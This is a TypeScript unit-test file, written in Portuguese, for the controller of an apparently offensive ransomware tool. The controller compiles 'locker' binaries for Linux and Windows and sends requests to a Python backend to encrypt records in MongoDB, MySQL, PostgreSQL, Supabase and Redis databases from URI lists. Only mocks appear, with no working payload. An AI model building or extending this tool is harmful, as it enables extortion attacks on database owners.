import { describe, it, expect, beforeEach } from "vitest";
import { RansomController } from "../../../src/infra/controllers/RansomController.js";
import { CompileRansomUseCase } from "../../../src/application/ransom/use-cases/CompileRansomUseCase.js";
import { MockRansomCompiler } from "../../mocks/MockRansomCompiler.js";
import { MockPythonWsClient } from "../../mocks/MockPythonWsClient.js";
import { Result } from "../../../src/shared/Result.js";

describe("RansomController", () => {
  let compiler: MockRansomCompiler;
  let wsClient: MockPythonWsClient;
  let controller: RansomController;
  let logs: string[];

  beforeEach(() => {
    compiler = new MockRansomCompiler();
    wsClient = new MockPythonWsClient();
    const useCase = new CompileRansomUseCase(compiler);
    controller = new RansomController(useCase, wsClient);
    logs = [];
  });

  const onLog = (msg: string) => logs.push(msg);

  describe("compile", () => {
    it("deve delegar para CompileRansomUseCase", async () => {
      const result = await controller.compile("linux", onLog);

      expect(result.isSuccess).toBe(true);
      expect(result.value!.binaryPath).toContain("locker_linux");
      expect(compiler.calls).toEqual(["linux"]);
    });

    it("deve propagar falha do compilador", async () => {
      compiler.result = Result.fail("Docker down");

      const result = await controller.compile("windows", onLog);

      expect(result.isFailure).toBe(true);
      expect(result.error).toContain("Docker down");
    });
  });

  describe("encryptDb", () => {
    it("deve enviar ransom_db para Python via WS em modo single", async () => {
      wsClient.sendResult = { success: true, data: { encrypted: 42, db: "MongoDB" } };

      const result = await controller.encryptDb("MongoDB", "single", "mongodb://host/db", onLog);

      expect(result.isSuccess).toBe(true);
      expect(result.value!.encrypted).toBe(42);
      expect(result.value!.db).toBe("MongoDB");
      expect(wsClient.sendCalls).toHaveLength(1);
      expect(wsClient.sendCalls[0].action).toBe("ransom_db");
      expect(wsClient.sendCalls[0].payload).toEqual({
        db: "MongoDB",
        mode: "single",
        uri: "mongodb://host/db",
      });
    });

    it("deve enviar file_path em modo file", async () => {
      wsClient.sendResult = { success: true, data: { encrypted: 100, db: "MySQL" } };

      const result = await controller.encryptDb("MySQL", "file", "/tmp/uris.txt", onLog);

      expect(result.isSuccess).toBe(true);
      expect(wsClient.sendCalls[0].payload).toEqual({
        db: "MySQL",
        mode: "file",
        file_path: "/tmp/uris.txt",
      });
    });

    it("deve logar início da operação", async () => {
      await controller.encryptDb("PostgreSQL", "single", "postgresql://host/db", onLog);

      expect(logs.some((l) => l.includes("ransom_db") && l.includes("PostgreSQL"))).toBe(true);
    });

    it("deve retornar falha quando Python responde com erro", async () => {
      wsClient.sendResult = { success: false, error: "KEY_CRIP_DATA não configurada" };

      const result = await controller.encryptDb("MongoDB", "single", "mongodb://host/db", onLog);

      expect(result.isFailure).toBe(true);
      expect(result.error).toContain("KEY_CRIP_DATA");
    });

    it("deve retornar falha genérica quando Python responde sem error string", async () => {
      wsClient.sendResult = { success: false };

      const result = await controller.encryptDb("MongoDB", "single", "mongodb://host/db", onLog);

      expect(result.isFailure).toBe(true);
      expect(result.error).toContain("Erro desconhecido");
    });

    it("deve retornar falha quando WS joga exceção", async () => {
      wsClient.shouldThrow = true;
      wsClient.throwError = "ECONNREFUSED";

      const result = await controller.encryptDb("MongoDB", "single", "mongodb://host/db", onLog);

      expect(result.isFailure).toBe(true);
      expect(result.error).toContain("Falha na conexão WS");
      expect(result.error).toContain("ECONNREFUSED");
    });

    it("deve receber push events do Python durante a operação", async () => {
      const originalSend = wsClient.send.bind(wsClient);
      wsClient.send = async (action, payload = {}) => {
        wsClient.simulateEvent({
          success: true,
          event: "ransom_db_log",
          data: { msg: "[*] 3 URI(s) processadas" },
        });
        wsClient.simulateEvent({
          success: true,
          event: "ransom_db_log",
          data: { msg: "[+] 15 registros criptografados" },
        });
        wsClient.sendCalls.push({ action, payload });
        return { success: true, data: { encrypted: 15, db: "MongoDB" } };
      };

      await controller.encryptDb("MongoDB", "single", "mongodb://host/db", onLog);

      expect(logs.some((l) => l.includes("3 URI(s)"))).toBe(true);
      expect(logs.some((l) => l.includes("15 registros"))).toBe(true);
    });

    it("deve fazer unsubscribe dos events ao terminar", async () => {
      await controller.encryptDb("MongoDB", "single", "mongodb://host/db", onLog);

      const logsBefore = logs.length;
      wsClient.simulateEvent({
        success: true,
        event: "ransom_db_log",
        data: { msg: "ghost event" },
      });
      expect(logs.length).toBe(logsBefore);
    });

    it("deve funcionar com todos os DbTargets", async () => {
      const targets = ["Supabase", "MongoDB", "MySQL", "PostgreSQL", "Redis"] as const;
      for (const db of targets) {
        wsClient.sendResult = { success: true, data: { encrypted: 1, db } };
        const result = await controller.encryptDb(db, "single", "uri://test", onLog);
        expect(result.isSuccess).toBe(true);
      }
      expect(wsClient.sendCalls).toHaveLength(5);
    });
  });

  describe("generateExample", () => {
    it("deve enviar mode=example para Python", async () => {
      wsClient.sendResult = { success: true, data: {} };

      const result = await controller.generateExample("MySQL", "/tmp/example.txt");

      expect(result.isSuccess).toBe(true);
      expect(result.value!.filePath).toBe("/tmp/example.txt");
      expect(result.value!.db).toBe("MySQL");
      expect(wsClient.sendCalls[0].payload).toEqual({
        db: "MySQL",
        mode: "example",
        output_path: "/tmp/example.txt",
      });
    });

    it("deve propagar erro do Python", async () => {
      wsClient.sendResult = { success: false, error: "Permissão negada" };

      const result = await controller.generateExample("MongoDB", "/root/file.txt");

      expect(result.isFailure).toBe(true);
      expect(result.error).toContain("Permissão negada");
    });

    it("deve retornar falha em exceção WS", async () => {
      wsClient.shouldThrow = true;

      const result = await controller.generateExample("MongoDB", "/tmp/x.txt");

      expect(result.isFailure).toBe(true);
      expect(result.error).toContain("Falha na conexão WS");
    });
  });
});
